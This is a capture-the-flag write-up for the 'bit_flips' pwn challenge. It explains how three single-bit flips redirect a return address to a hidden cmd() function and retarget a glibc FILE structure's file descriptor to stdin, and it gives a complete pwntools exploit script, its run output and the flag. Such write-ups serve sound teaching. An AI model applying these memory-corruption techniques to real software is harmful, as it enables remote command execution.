# bit_flips — PWN (250pts, Medium)

> "Can you do it in just 3 bit flips?" — Suffering hasn't begun

## Summary

Binary with full protections (Full RELRO, Canary, NX, PIE) that allows XOR of an arbitrary bit in memory, 3 times. It is exploited by redirecting execution flow to a hidden function `cmd()` and modifying the file descriptor of a glibc `FILE` structure so it reads from stdin instead of a local file.

**Flag:** `0xfun{3_b1t5_15_4ll_17_74k35_70_g37_RC3_safhu8}`

## Binary Analysis

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

### Key Functions

| Function  | Offset | Description |
|-----------|--------|-------------|
| `setup`   | 0x11e9 | Disables stdin/stdout buffering, opens `./commands` -> `obj.f` (global FILE* at PIE+0x4050) |
| `vuln`    | 0x132f | Filters 4 addresses (main, system, stack, sbrk), calls `bit_flip()` 3 times |
| `bit_flip`| 0x124c | Reads address (hex) + bit (0-7), XORs that bit at that address |
| `cmd`     | 0x1429 | Reads lines from `obj.f` with `fgets()` and executes each one with `system()` |
| `main`    | 0x1405 | Calls `setup()` and `vuln()`. **Never calls `cmd()`** |

### Provided Leaks

```
&main     = 0x...   -> PIE base
&system   = 0x...   -> libc base
&address  = 0x...   -> stack address (to calculate vuln's ret addr)
sbrk(NULL)= 0x...   -> heap top
```

## Exploitation Strategy

We have 3 bit flips. We need:

1. **Redirect execution to `cmd()`** — which is never called normally
2. **Make `cmd()` read from stdin** — instead of the `./commands` file (which on remote only prints "Did you pwn me?")

### Flip 1: Return address -> cmd+1

The return address of `vuln()` is at `&address + 0x18`. Its low byte is `0x22` (points to `main+0x1d` = PIE+0x1422). We want to go to `cmd` (PIE+0x1429), but we need to jump to `cmd+1` (PIE+0x142a) to **skip the `push rbp`** and keep the stack aligned to 16 bytes (required by `system()` which uses SSE instructions).

```
0x22 = 0010 0010
0x2a = 0010 1010  <- flip bit 3
```

**1 flip**: bit 3 of the low byte of the return address.

### Flips 2-3: Change fd in FILE struct (3 -> 0 = stdin)

`fopen("./commands")` returns a `FILE*` whose `_fileno` field (offset +0x70 in the struct) contains `fd=3`. We need to change it to `fd=0` (stdin/socket):

```
3 = 0b11
2 = 0b10  <- flip bit 0
0 = 0b00  <- flip bit 1
```

**2 flips**: bits 0 and 1 of the `_fileno` field in the FILE structure.

### Locating the FILE Structure

The FILE* is on the heap. Using the `sbrk(NULL)` leak (heap top):

```
FILE* = sbrk - OFFSET
fd_addr = FILE* + 0x70
```

## The Trap: Incorrect libc

The challenge provides `libc.so.6` (glibc 2.42 from Arch Linux), but **the remote uses the system libc** (glibc 2.39 from Ubuntu 24.04). This changes the heap layout:

| Libc | Offset (sbrk -> FILE*) |
|------|----------------------|
| glibc 2.42 (provided) | `0x20cf0` |
| glibc 2.39 (system Ubuntu) | `0x20d60` |

This was discovered by setting up a Docker container identical to the remote (`FROM ubuntu:24.04`) and reading `/proc/pid/mem` to obtain the real FILE*. Confirmation came from comparing the `system()` offset in the libc:

```python
# Provided (2.42): system @ libc+0x53ac0  -> doesn't align with remote
# System (2.39):   system @ libc+0x58750  -> aligns perfectly!
```

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import time

context.binary = elf = ELF('./bitflips_files/main', checksec=False)
p = remote('chall.0xfun.org', 39580)

p.recvuntil(b"generous today\n")
main_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
system_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
address_addr = int(p.recvline().decode().strip().split('= ')[1], 16)
sbrk_addr = int(p.recvline().decode().strip().split('= ')[1], 16)

pie_base = main_addr - elf.symbols['main']
ret_addr_loc = address_addr + 0x18

# Offset for glibc 2.39 (Ubuntu 24.04)
file_ptr = sbrk_addr - 0x20d60
fd_addr = file_ptr + 0x70

# Flip 1: ret -> cmd+1 (bit 3: 0x22 -> 0x2a)
p.recvuntil(b"> ")
p.sendline(f"{ret_addr_loc:x}".encode())
p.sendline(b"3")

# Flip 2: fd bit 0 (3 -> 2)
p.recvuntil(b"> ")
p.sendline(f"{fd_addr:x}".encode())
p.sendline(b"0")

# Flip 3: fd bit 1 (2 -> 0 = stdin)
p.recvuntil(b"> ")
p.sendline(f"{fd_addr:x}".encode())
p.sendline(b"1")

# cmd() now reads from stdin -> send command
time.sleep(0.3)
p.sendline(b"cat /srv/app/flag")
time.sleep(0.3)
data = p.recvall(timeout=5)
print(data.decode(errors='replace'))
```

## Execution

```
$ python3 exploit_solve.py REMOTE
[+] Opening connection to chall.0xfun.org on port 39580: Done
[*] Flip 1: ret -> cmd+1
[*] Flip 2: fd bit 0 (3->2)
[*] Flip 3: fd bit 1 (2->0=stdin)
[+] Output:
    0xfun{3_b1t5_15_4ll_17_74k35_70_g37_RC3_safhu8}
```

## Lessons Learned

1. **Never trust the provided libc**: always verify with the offset of leaked functions whether it matches the distributed libc.
2. **Replicate the exact environment with Docker**: the correct methodology is to test locally -> Docker -> remote.
3. **Stack alignment on x86-64**: jumping to `cmd` directly crashes `system()` due to SSE misalignment. Jumping to `cmd+1` (skip `push rbp`) fixes the alignment with 0 extra flips.
4. **glibc FILE structure**: `_fileno` at offset +0x70 allows redirecting which fd `fgets()` reads from. Changing fd=3->0 with 2 bit flips turns file reading into stdin reading.
